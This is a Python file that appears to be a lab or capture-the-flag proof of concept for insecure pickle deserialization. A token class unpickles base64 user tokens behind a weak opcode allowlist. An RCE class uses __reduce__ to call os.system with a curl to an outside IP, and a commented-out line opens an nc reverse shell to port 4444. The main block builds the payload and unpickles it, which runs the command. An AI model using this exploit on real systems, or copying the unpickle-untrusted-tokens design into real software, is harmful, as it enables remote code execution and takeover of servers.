import pickle
import base64
import os
import pickletools
from uuid import UUID

class Tokens():
    
    allowedOps = [3, None, 0, 'auth', 1, 'userid', 2, 4, 62]
    expected_length = 100
    guest_uuid = '00000000-0000-4000-8000-000000000000'

    @staticmethod
    def create_token(userProfile):
        data = {'auth':1,'userid':str(userProfile.userid) }
        p = pickle.dumps(data)
        return base64.b64encode(p).decode('utf-8')

    @staticmethod
    def create_guest_token():
        data = {'auth':0,'userid':Tokens.guest_uuid}
        p = pickle.dumps(data)
        return base64.b64encode(p).decode('utf-8')
    
    @staticmethod
    def is_guest_token(token):
        if Tokens.is_safe(token):
            _data = pickle.loads(base64.b64decode(token))
            if _data['userid'] == Tokens.guest_uuid:
                return True
        
        return False

    @staticmethod
    def validate_token(token):
        if Tokens.is_safe(token):
            data = pickle.loads(base64.b64decode(token))
            if 'userid' in data.keys():
                _userid = data['userid']
                '''
                try: 
                    _profile = UserProfile.objects.get(userid=_userid)
                    return _profile
                except ObjectDoesNotExist:
                    return None
                '''
            else:
                return None
        else:
            # log it?
            print('unsafe token')
            return None

    @staticmethod
    def is_safe(token):
        try:
            for p in pickletools.genops(base64.b64decode(token)):
                if not any(p[1] == op for op in Tokens.allowedOps):
                    if not Tokens.validate_uuid4(p[1]):
                        return False

            if ((Tokens.expected_length - 5) <=len(token) <= (Tokens.expected_length + 5)):
                return True
            else:
                return False
        except:
            # bad padding
            return False
            
    @staticmethod
    def validate_uuid4(uuid_string):
        try:
            val = UUID(uuid_string, version=4)
        except ValueError:
            return False
        return val.hex == uuid_string.replace('-', '')

class RCE:
  def __reduce__(self):
    #cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ''/bin/sh -i 2>&1 | nc 192.168.119.130 4444 > /tmp/f')
    cmd = ('curl http://192.168.119.130/gotcha')
    #cmd = ('touch /tmp/apples.txt')
    return os.system, (cmd,)


if __name__ == '__main__':
  pickled = pickle.dumps(RCE())
  print("utf-8",base64.b64encode(pickled).decode('utf-8'))
  print("url safe",base64.urlsafe_b64encode(pickled))
  print("regular",base64.b64encode(pickled))
  Tokens.validate_token(base64.b64encode(pickled).decode('utf-8'))
  for opcode, arg, pos in pickletools.genops(pickled):
      #print(opcode,arg,pos)
      print(opcode.code, arg, pos)
  #print(pickled)
  test = pickle.loads(base64.b64decode(  base64.b64encode(pickled).decode('utf-8')  ))
  with open('cucked.pickle','wb') as handle:
      pickle.dumps(RCE(), handle)
  print(pickled)